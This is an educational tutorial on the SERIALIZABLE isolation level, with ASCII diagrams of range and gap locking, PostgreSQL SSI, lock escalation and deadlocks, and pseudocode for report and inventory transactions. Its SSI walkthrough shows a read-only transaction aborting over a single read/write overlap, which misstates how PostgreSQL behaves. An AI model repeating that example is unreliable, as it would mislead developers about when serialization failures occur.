<p>Locking Strategy:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502       SERIALIZABLE - Locking Strategy                   \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502 READ Operations:                                        \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510         \u2502\n\u2502 \u2502 \u2022 Acquires SHARED RANGE/PREDICATE LOCKS    \u2502         \u2502\n\u2502 \u2502 \u2022 Locks rows AND gaps between rows         \u2502         \u2502\n\u2502 \u2502 \u2022 Holds locks until COMMIT/ROLLBACK        \u2502         \u2502\n\u2502 \u2502 \u2022 Prevents inserts in locked ranges        \u2502         \u2502\n\u2502 \u2502 \u2022 Blocks conflicting operations            \u2502         \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518         \u2502\n\u2502                                                         \u2502\n\u2502 WRITE Operations:                                       \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510         \u2502\n\u2502 \u2502 \u2022 Acquires EXCLUSIVE RANGE LOCKS           \u2502         \u2502\n\u2502 \u2502 \u2022 Locks entire affected ranges             \u2502         \u2502\n\u2502 \u2502 \u2022 Holds locks until COMMIT/ROLLBACK        \u2502         \u2502\n\u2502 \u2502 \u2022 Blocks ALL conflicting operations        \u2502         \u2502\n\u2502 \u2502 \u2022 Prevents any concurrent modifications    \u2502         \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518         \u2502\n\u2502                                                         \u2502\n\u2502 Lock Types Used:                                        \u2502\n\u2502                                                         \u2502\n\u2502 1. Row Locks (X or S):                                 \u2502\n\u2502    \u2022 Lock individual existing rows                     \u2502\n\u2502                                                         \u2502\n\u2502 2. Gap Locks:                                          \u2502\n\u2502    \u2022 Lock spaces BETWEEN rows                          \u2502\n\u2502    \u2022 Prevent inserts in gaps                           \u2502\n\u2502                                                         \u2502\n\u2502 3. Next-Key Locks (Row + Gap):                         \u2502\n\u2502    \u2022 Lock row + gap before it                          \u2502\n\u2502    \u2022 MySQL InnoDB's approach                           \u2502\n\u2502                                                         \u2502\n\u2502 4. Predicate Locks:                                    \u2502\n\u2502    \u2022 Lock based on query predicates                    \u2502\n\u2502    \u2022 PostgreSQL SSI approach                           \u2502\n\u2502                                                         \u2502\n\u2502 Lock Compatibility Matrix:                              \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510        \u2502\n\u2502 \u2502            \u2502  Read    \u2502  Write   \u2502  Insert  \u2502        \u2502\n\u2502 \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524        \u2502\n\u2502 \u2502 Read       \u2502   \u2713      \u2502    \u2717     \u2502    \u2717     \u2502        \u2502\n\u2502 \u2502 Write      \u2502   \u2717      \u2502    \u2717     \u2502    \u2717     \u2502        \u2502\n\u2502 \u2502 Insert     \u2502   \u2717      \u2502    \u2717     \u2502    \u2717     \u2502        \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518        \u2502\n\u2502                                                         \u2502\n\u2502 Three Main Implementation Approaches:                   \u2502\n\u2502                                                         \u2502\n\u2502 1. Two-Phase Locking (2PL) - Traditional:              \u2502\n\u2502    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510        \u2502\n\u2502    \u2502 \u2022 Acquire all locks before releasing any \u2502        \u2502\n\u2502    \u2502 \u2022 Growing phase: acquire locks           \u2502        \u2502\n\u2502    \u2502 \u2022 Shrinking phase: release locks         \u2502        \u2502\n\u2502    \u2502 \u2022 Locks rows + ranges + gaps             \u2502        \u2502\n\u2502    \u2502 \u2022 Heavy blocking, many waits             \u2502        \u2502\n\u2502    \u2502 \u2022 Risk of deadlocks                      \u2502        \u2502\n\u2502    \u2502 \u2022 Used by: SQL Server, MySQL             \u2502        \u2502\n\u2502    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518        \u2502\n\u2502                                                         \u2502\n\u2502 2. Serializable Snapshot Isolation (SSI) - Modern:     \u2502\n\u2502    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510        \u2502\n\u2502    \u2502 \u2022 MVCC-based (no read locks!)            \u2502        \u2502\n\u2502    \u2502 \u2022 Detect conflicts instead of prevent    \u2502        \u2502\n\u2502    \u2502 \u2022 Track read/write dependencies          \u2502        \u2502\n\u2502    \u2502 \u2022 Abort transactions on conflicts        \u2502        \u2502\n\u2502    \u2502 \u2022 Better concurrency than locking        \u2502        \u2502\n\u2502    \u2502 \u2022 Requires retry logic                   \u2502        \u2502\n\u2502    \u2502 \u2022 Used by: PostgreSQL                    \u2502        \u2502\n\u2502    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518        \u2502\n\u2502                                                         \u2502\n\u2502 3. Optimistic Concurrency Control (OCC):               \u2502\n\u2502    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510        \u2502\n\u2502    \u2502 \u2022 No locks during execution              \u2502        \u2502\n\u2502    \u2502 \u2022 Validate at commit time                \u2502        \u2502\n\u2502    \u2502 \u2022 Abort if conflicts detected            \u2502        \u2502\n\u2502    \u2502 \u2022 Good for low-contention workloads      \u2502        \u2502\n\u2502    \u2502 \u2022 Poor for high-contention               \u2502        \u2502\n\u2502    \u2502 \u2022 Used by: Some in-memory databases      \u2502        \u2502\n\u2502    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518        \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>How Range Locking Works (MySQL InnoDB):</p> <pre><code>Scenario: Preventing phantom reads with gap locks\n\nIndex on 'age' column: [20, 25, 30, 35, 40]\n                         \u2191   \u2191   \u2191   \u2191   \u2191\nGaps:            (-\u221e,20] (20,25] (25,30] (30,35] (35,40] (40,+\u221e)\n\nT1: BEGIN\nT1: SELECT * FROM users WHERE age &gt; 25\n    \u2193\n    Locks acquired:\n    \u2022 Row lock on age=30: \ud83d\udd12\n    \u2022 Gap lock (25, 30]:  \ud83d\udd12 (prevents insert age=26-29)\n    \u2022 Row lock on age=35: \ud83d\udd12\n    \u2022 Gap lock (30, 35]:  \ud83d\udd12 (prevents insert age=31-34)\n    \u2022 Row lock on age=40: \ud83d\udd12\n    \u2022 Gap lock (35, 40]:  \ud83d\udd12 (prevents insert age=36-39)\n    \u2022 Gap lock (40, +\u221e):  \ud83d\udd12 (prevents insert age&gt;40)\n\n    Result: Entire range age&gt;25 is LOCKED!\n\nT2: BEGIN\nT2: INSERT INTO users (age) VALUES (28)\n    \u2193\n    Value 28 falls in gap (25, 30]\n    \u2193\n    BLOCKED! (gap is locked by T1)\n    \u2193\n    [T2 WAITS...]\n\nT2: INSERT INTO users (age) VALUES (50)\n    \u2193\n    Value 50 falls in gap (40, +\u221e)\n    \u2193\n    BLOCKED! (gap is locked by T1)\n    \u2193\n    [T2 WAITS...]\n\nT1: SELECT * FROM users WHERE age &gt; 25\n    \u2193\n    Returns same rows as before \u2713\n    NO PHANTOMS! (inserts were blocked)\n\nT1: COMMIT\n    \u2193\n    Releases all row and gap locks \ud83d\udd13\ud83d\udd13\ud83d\udd13\n\nT2: [UNBLOCKED]\n    \u2193\n    Inserts complete\nT2: COMMIT\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\nKey: Gap locks prevent inserts in locked ranges\n</code></pre> <p>How SSI Works (PostgreSQL):</p> <pre><code>Scenario: Serializable Snapshot Isolation\n\nPostgreSQL uses conflict detection, not locking!\n\nT1: BEGIN TRANSACTION ISOLATION LEVEL SERIALIZABLE\n    \u2193\n    Creates snapshot at time=100\n    Tracks: read_set = {}, write_set = {}\n\nT1: SELECT SUM(balance) FROM accounts WHERE type='savings'\n    \u2193\n    Reads using snapshot (time=100)\n    Tracks: read_set = {accounts WHERE type='savings'}\n    NO LOCKS! Just tracking \u2713\n    Returns: SUM = $10,000\n\nT2: BEGIN TRANSACTION ISOLATION LEVEL SERIALIZABLE\n    \u2193\n    Creates snapshot at time=101\n\nT2: INSERT INTO accounts (type, balance) VALUES ('savings', 1000)\n    \u2193\n    Tracks: write_set = {new account, type='savings'}\n    NO BLOCKING! Insert succeeds \u2713\nT2: COMMIT (time=102)\n    \u2193\n    Success - no conflicts detected\n\nT1: SELECT SUM(balance) FROM accounts WHERE type='savings'\n    \u2193\n    Still uses snapshot (time=100)\n    Returns: SUM = $10,000 (same as before)\n    \u2193\n    Conflict detected!\n    \u2193\n    T1's read_set overlaps with T2's write_set\n    (both involve accounts WHERE type='savings')\n    \u2193\nT1: COMMIT\n    \u2193\n    ABORTED! SerializationFailure\n    ERROR: could not serialize access due to read/write\n           dependencies among transactions\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\nAdvantages of SSI:\n\u2022 No read locks (better concurrency)\n\u2022 Detects conflicts at commit time\n\u2022 Fewer deadlocks\n\u2022 Must implement retry logic\n\nDisadvantages:\n\u2022 Transactions can fail at commit\n\u2022 Need application-level retries\n\u2022 More complex for developers\n</code></pre> <p>Lock Escalation and Performance:</p> <pre><code>Scenario: Full table scan with SERIALIZABLE\n\nQuery: SELECT * FROM orders WHERE status = 'pending'\n\nIf many rows match (e.g., 10,000 rows):\n\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 Row-Level Locking:                          \u2502\n\u2502 \u2022 Acquire 10,000 row locks                  \u2502\n\u2502 \u2022 Acquire gaps between all rows             \u2502\n\u2502 \u2022 High memory overhead                      \u2502\n\u2502 \u2022 Slow lock acquisition                     \u2502\n\u2502 \u2022 May hit lock limit                        \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n          \u2193\n    Lock Escalation\n          \u2193\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 Table-Level Locking:                        \u2502\n\u2502 \u2022 Acquire single table lock                 \u2502\n\u2502 \u2022 Blocks ALL access to table                \u2502\n\u2502 \u2022 Lower memory overhead                     \u2502\n\u2502 \u2022 Faster lock acquisition                   \u2502\n\u2502 \u2022 But worse concurrency!                    \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nDatabases decide when to escalate:\n\u2022 SQL Server: After ~5000 locks\n\u2022 MySQL: Based on memory pressure\n\u2022 PostgreSQL: Generally avoids escalation\n</code></pre> <p>Deadlock Example:</p> <pre><code>Scenario: Classic deadlock with SERIALIZABLE\n\nT1: BEGIN SERIALIZABLE\nT1: SELECT * FROM accounts WHERE id = 1\n    \u2193\n    Locks row 1 + surrounding gaps: \ud83d\udd12\n\nT2: BEGIN SERIALIZABLE\nT2: SELECT * FROM accounts WHERE id = 2\n    \u2193\n    Locks row 2 + surrounding gaps: \ud83d\udd12\n\nT1: UPDATE accounts SET balance = 500 WHERE id = 2\n    \u2193\n    Needs exclusive lock on row 2\n    \u2193\n    BLOCKED! (T2 holds lock)\n    \u2193\n    [T1 WAITS for T2...]\n\nT2: UPDATE accounts SET balance = 500 WHERE id = 1\n    \u2193\n    Needs exclusive lock on row 1\n    \u2193\n    BLOCKED! (T1 holds lock)\n    \u2193\n    [T2 WAITS for T1...]\n\n    \u2193\u2193\u2193 DEADLOCK! \u2193\u2193\u2193\n\nDatabase detects cycle:\nT1 \u2192 waits for \u2192 T2 \u2192 waits for \u2192 T1\n\nDatabase chooses victim (usually T2):\nT2: ABORTED! (Deadlock victim)\n    ERROR: deadlock detected\n\nT1: [UNBLOCKED]\n    Update proceeds\nT1: COMMIT\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\nDeadlock prevention strategies:\n1. Always acquire locks in same order\n2. Use timeouts\n3. Implement retry logic\n4. Keep transactions short\n5. Use lower isolation if acceptable\n</code></pre> <p>How it Works:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502            SERIALIZABLE - How it Works                  \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502  \u2022 Acquires locks on rows AND ranges                    \u2502\n\u2502  \u2022 Holds all locks until transaction ends               \u2502\n\u2502  \u2022 Prevents inserts/deletes in queried ranges           \u2502\n\u2502  \u2022 Equivalent to serial execution                       \u2502\n\u2502                                                         \u2502\n\u2502  Transaction 1          Database          Transaction 2 \u2502\n\u2502                                                         \u2502\n\u2502  SELECT WHERE                                           \u2502\n\u2502  price &gt; 100        [Range 100-\u221e LOCKED]               \u2502\n\u2502  (locks range!) \u2500\u2500\u2500\u2192 \ud83d\udd12\ud83d\udd12\ud83d\udd12                             \u2502\n\u2502                         \u2551                               \u2502\n\u2502                         \u2551    INSERT price=120           \u2502\n\u2502                         \u2551       \u2193 BLOCKED!              \u2502\n\u2502                         \u2551    [waiting...]               \u2502\n\u2502  SELECT WHERE           \u2551                               \u2502\n\u2502  price &gt; 100 \u2713      [Same results]                     \u2502\n\u2502  (no phantoms!)     \ud83d\udd12\ud83d\udd12\ud83d\udd12 STILL LOCKED                  \u2502\n\u2502                         \u2551                               \u2502\n\u2502  COMMIT \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2192 \ud83d\udd13\ud83d\udd13\ud83d\udd13 UNLOCKED                    \u2502\n\u2502                         \u2193                               \u2502\n\u2502                      [price=120] \u2190 T2 can now insert    \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Visual Diagram:</p> <pre><code>SERIALIZABLE - Complete Isolation:\n\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 T1: BEGIN                                            \u2502\n\u2502 T1: SELECT * WHERE age &gt; 25                          \u2502\n\u2502     \u2192 Returns [Alice, Bob, Carol]                    \u2502\n\u2502     \u2193                                                \u2502\n\u2502     [Range age&gt;25 LOCKED] \ud83d\udd12\ud83d\udd12\ud83d\udd12                      \u2502\n\u2502         \u2551                                            \u2502\n\u2502         \u2551\u2550\u2550&gt; T2: INSERT (name=Dave, age=30)          \u2502\n\u2502         \u2551    \u2193 BLOCKED! (in locked range)            \u2502\n\u2502         \u2551    [waiting for T1...]                     \u2502\n\u2502         \u2551                                            \u2502\n\u2502         \u2551\u2550\u2550&gt; T3: UPDATE age=26 WHERE name=Alice      \u2502\n\u2502         \u2551    \u2193 BLOCKED! (row in locked range)        \u2502\n\u2502         \u2551    [waiting for T1...]                     \u2502\n\u2502     \u2193   \u2551                                            \u2502\n\u2502 T1: SELECT * WHERE age &gt; 25                          \u2502\n\u2502     \u2192 Returns [Alice, Bob, Carol] \u2713                  \u2502\n\u2502     SAME RESULTS! (no phantoms, no changes)          \u2502\n\u2502     \u2551                                                \u2502\n\u2502 T1: COMMIT                                           \u2502\n\u2502     \ud83d\udd13\ud83d\udd13\ud83d\udd13 UNLOCKED                                    \u2502\n\u2502         \u2551                                            \u2502\n\u2502         \u2560\u2550\u2550&gt; T2: INSERT completes                    \u2502\n\u2502         \u255a\u2550\u2550&gt; T3: UPDATE completes                    \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nSerial Equivalence:\n\nConcurrent execution with SERIALIZABLE:\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 T1 \u2500\u2500\u2500 T2 \u2500\u2500\u2500 T3                 \u2502\n\u2502  \u2572      \u2571      \u2572                 \u2502\n\u2502   \u2572    \u2571        \u2572                \u2502\n\u2502    \u2572  \u2571          \u2572               \u2502\n\u2502     \u2572\u2571            \u2572              \u2502\n\u2502  (interleaved but isolated)      \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nEquivalent to serial execution:\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 T1 \u2192 T2 \u2192 T3                     \u2502\n\u2502 (one at a time)                  \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nBoth produce SAME results!\n\nProblems Allowed:\n\u2713 Dirty Read        - NO\n\u2713 Non-Repeatable    - NO\n\u2713 Phantom Read      - NO\n</code></pre> <p>Pseudo Code:</p> <pre><code># SERIALIZABLE Example\n\ndef serializable_transaction(db):\n    \"\"\"Demonstrates SERIALIZABLE behavior\"\"\"\n    db.set_isolation_level(\"SERIALIZABLE\")\n    db.begin()\n\n    # First query\n    rows1 = db.execute(\n        \"SELECT * FROM orders WHERE status = 'pending'\"\n    ).fetchall()\n    count1 = len(rows1)\n    print(f\"First query: {count1} rows\")\n\n    # Range is now locked!\n    # - No inserts with status='pending' allowed\n    # - No updates changing status to 'pending' allowed\n    # - No deletes of rows with status='pending' allowed\n\n    time.sleep(5)  # Other transactions blocked\n\n    # Second query - GUARANTEED same results\n    rows2 = db.execute(\n        \"SELECT * FROM orders WHERE status = 'pending'\"\n    ).fetchall()\n    count2 = len(rows2)\n    print(f\"Second query: {count2} rows\")\n\n    assert count1 == count2  # Always true!\n    assert rows1 == rows2    # Exact same rows!\n\n    db.commit()  # Other transactions can now proceed\n\n\n# Financial report - requires complete accuracy\ndef generate_financial_report(db, start_date, end_date):\n    \"\"\"Critical financial report with SERIALIZABLE\"\"\"\n    db.set_isolation_level(\"SERIALIZABLE\")\n    db.begin()\n\n    try:\n        # Get all transactions in date range\n        transactions = db.execute(\"\"\"\n            SELECT * FROM transactions\n            WHERE date BETWEEN ? AND ?\n            ORDER BY date\n        \"\"\", [start_date, end_date]).fetchall()\n\n        # Calculate metrics\n        total_revenue = db.execute(\"\"\"\n            SELECT SUM(amount) FROM transactions\n            WHERE date BETWEEN ? AND ? AND type = 'credit'\n        \"\"\", [start_date, end_date]).fetchone()[0]\n\n        total_expenses = db.execute(\"\"\"\n            SELECT SUM(amount) FROM transactions\n            WHERE date BETWEEN ? AND ? AND type = 'debit'\n        \"\"\", [start_date, end_date]).fetchone()[0]\n\n        # Count transactions\n        count = db.execute(\"\"\"\n            SELECT COUNT(*) FROM transactions\n            WHERE date BETWEEN ? AND ?\n        \"\"\", [start_date, end_date]).fetchone()[0]\n\n        # All queries see consistent snapshot\n        # No new transactions can be inserted\n        # No existing transactions can be modified\n        # No transactions can be deleted\n\n        report = {\n            'transactions': transactions,\n            'count': count,\n            'revenue': total_revenue,\n            'expenses': total_expenses,\n            'profit': total_revenue - total_expenses\n        }\n\n        db.commit()\n        return report\n\n    except Exception as e:\n        db.rollback()\n        raise\n\n\n# Inventory management - prevent overselling\ndef reserve_inventory(db, product_id, quantity):\n    \"\"\"Reserve inventory with SERIALIZABLE to prevent overselling\"\"\"\n    db.set_isolation_level(\"SERIALIZABLE\")\n    db.begin()\n\n    try:\n        # Check available stock (locks the row AND range)\n        stock = db.execute(\n            \"SELECT quantity FROM inventory WHERE product_id = ?\",\n            [product_id]\n        ).fetchone()[0]\n\n        if stock &lt; quantity:\n            raise InsufficientStockError()\n\n        # No other transaction can:\n        # 1. Modify this row\n        # 2. Insert new rows for this product\n        # 3. See inconsistent stock levels\n\n        # Deduct inventory\n        db.execute(\n            \"UPDATE inventory SET quantity = quantity - ? WHERE product_id = ?\",\n            [quantity, product_id]\n        )\n\n        # Create reservation\n        db.execute(\n            \"INSERT INTO reservations (product_id, quantity, timestamp) VALUES (?, ?, ?)\",\n            [product_id, quantity, now()]\n        )\n\n        db.commit()\n        return True\n\n    except Exception as e:\n        db.rollback()\n        return 